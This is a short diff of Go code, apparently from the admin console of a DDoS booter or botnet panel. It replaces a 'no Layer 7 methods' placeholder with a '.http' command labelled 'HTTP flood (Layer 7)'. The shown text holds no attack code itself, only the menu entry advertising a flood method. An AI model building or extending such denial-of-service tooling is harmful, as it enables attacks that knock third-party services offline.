@@ -551,7 +551,7 @@ func Admin(conn net.Conn) {
 
 		case "methods_layer7", "methods_l7":
 			rows := [][]string{
-				{"Not yet", ansiCommands + "No Layer 7 methods available" + ansiReset},
+				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
 
